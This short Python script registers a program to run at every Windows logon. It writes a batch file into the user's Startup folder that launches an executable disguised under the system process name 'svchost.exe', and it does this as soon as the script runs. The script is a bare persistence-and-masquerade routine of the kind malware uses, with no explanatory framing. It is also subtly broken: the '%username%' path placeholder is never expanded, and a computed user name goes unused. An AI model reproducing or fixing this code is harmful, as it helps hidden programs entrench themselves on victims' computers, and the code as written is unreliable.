import getpass
import os
USER_NAME = getpass.getuser()


def add_to_startup(file_path=r"C:/Users/333zl\Documents\Python\untitled/build/exe.win-amd64-3.6/svchost.exe"):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    with open(bat_path + '\\' + "open.bat", "w") as bat_file:
        bat_file.write(r'start "" %s 1' % file_path)



add_to_startup()
